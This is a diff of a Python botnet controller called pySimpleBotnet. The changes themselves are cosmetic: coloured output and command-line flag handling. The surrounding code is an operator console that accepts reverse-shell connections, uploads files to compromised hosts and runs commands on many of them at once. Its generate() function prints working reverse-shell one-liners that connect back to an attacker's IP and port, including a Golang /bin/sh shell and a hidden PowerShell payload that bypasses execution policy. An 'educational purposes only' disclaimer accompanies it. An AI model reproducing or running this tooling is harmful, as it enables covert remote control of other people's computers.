@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 import os, socket, threading, sys, time, queue
-
 # pySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers. This software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers
 # FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE
 # by Hubert Kasperek
@@ -23,7 +22,7 @@ def createSocket(host,port):
       sock.listen(1)
       create_threads()
    except socket.error:
-      print('\033[93m'+"Error while creating a socket: "+str(socket.error))
+      print('\033[93m'+"Error while creating a socket: "+str(socket.error)+'\033[0m')
 
 def accept_cons():
    while True:
@@ -34,7 +33,7 @@ def accept_cons():
          addr_g.append(addr)
          print("\n"+addr[0]+" connected")
       except:
-         print('\033[93m'+"Error while accepting connection")
+         print('\033[93m'+"Error while accepting connection"+'\033[0m')
 
 def create_threads():
    for _ in range(1):
@@ -160,7 +159,7 @@ def conn_check():
 
 def help_menu():
    print("\n\tpySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers\n\tThis software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers\n\tFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE")
-   print("\n   start arguments\n-n - skip intro(no intro)\n-l [PORT] - start program with listening on a certain port\n-h - start program with help menu\n-g [IP] [PORT] - generate some reverse tcp shells\n-e - exit (useful if you want to only read help menu or generate reverse shells without running script)")
+   print("\n   start arguments\n-e (this argument must be given first) - script executes after function that terminates script after execution (-h and -g)\n-n - skip intro(no intro)\n-l [PORT] - start program with listening on a certain port\n-h - start program with help menu\n-g [IP] [PORT] - generate some reverse tcp shells")
    print("\n   pySB[*] shell\nhelp - help menu\nlisten [PORT] - listen on certain port\ncons - check connections\nclear - clear terminal\ngenerate [IP] [PORT] - generate some tcp reverse shells\nselect [ID] - add connection to \"selected\" connections (useful when you want to send files/commands to multiple computers, but you don't want to send to all computers)\nos - operating system shell\nshow - show selected connections\nremove [ID] - remove connection from selected\nupload [FILE_PATH] a/s - upload file to remote machines\n   a - all connections\n   s - selected connections\nmultiexec a/s - execute commands on multiple computers\n   a - all connections\n   s - selected connections")
    print("\n   os shell\nexit! - exit os shell")
    print("\n   reverse shell\nexit! - exit reverse shell\nupload! [FILE_PATH] - upload file to remote machine")
@@ -173,13 +172,13 @@ def generate(ip, port):
    print("Golang:\n\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+ip+":"+port+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n")
    print("Powershell:\n\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+ip+"\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n")
 def intro():
-   print("             ___________ ___   _   _____   \n            /  ___| ___ \  _/\| |/\_  \ \  \n _ __  _   _\ `--.| |_/ / | \ ` ' / | |\ \ \n| '_ \| | | |`--. \ ___ \ ||_     _|| | > >\n| |_) | |_| /\__/ / |_/ / | / , . \ | |/ / \n| .__/ \__, \____/\____/| |_\/|_|\/_| /_/  \n| |     __/ |           |___|     |___|    \n|_|    |___/                               \n")
+   print('\033[36m'+"             ___________ ___   _   _____   \n            /  ___| ___ \  _/\| |/\_  \ \  \n _ __  _   _\ `--.| |_/ / | \ ` ' / | |\ \ \n| '_ \| | | |`--. \ ___ \ ||_     _|| | > >\n| |_) | |_| /\__/ / |_/ / | / , . \ | |/ / \n| .__/ \__, \____/\____/| |_\/|_|\/_| /_/  \n| |     __/ |           |___|     |___|    \n|_|    |___/                               \n"+'\033[0m')
    for char in "by Hubert Kasperek":
       time.sleep(0.15)
       sys.stdout.write(char)
       sys.stdout.flush()
-   print("\nhttps://github.com/Hukasx0/pythonSimpleBotnet")
-   print("FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE\n")
+   print('\033[92m'+"\nhttps://github.com/Hukasx0/pythonSimpleBotnet"+'\033[0m')
+   print('\033[91m'+"FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE\n"+'\033[0m')
 def main_shell():
    while True:
       an = input("pySB[*]> ").lower()
@@ -235,18 +234,23 @@ def main_shell():
       else:
          pass
 intro_o = True
+execute = False
 for i in range(1, len(sys.argv)):
-   if sys.argv[i] == "-n":
+   if sys.argv[i] == "-e":
+       execute = True
+   elif sys.argv[i] == "-n":
       intro_o = False
-      print("pySimpleBotnet by Hubert Kasperek\nhttps://github.com/Hukasx0/pythonSimpleBotnet\nFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE")
+      print("pySimpleBotnet by Hubert Kasperek\n\033[92mhttps://github.com/Hukasx0/pythonSimpleBotnet\033[0m\n\033[91mFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE\033[0m")
    elif sys.argv[i] == "-l":
       createSocket("",int(sys.argv[i+1]))
    elif sys.argv[i] == "-h":
       help_menu()
+      if not execute:
+          exit()
    elif sys.argv[i] == "-g":
        generate(sys.argv[i+1],sys.argv[i+2])
-   elif sys.argv[i] == "-e":
-      exit()
+       if not execute:
+           exit()
 if intro_o:
     intro()
 main_shell()
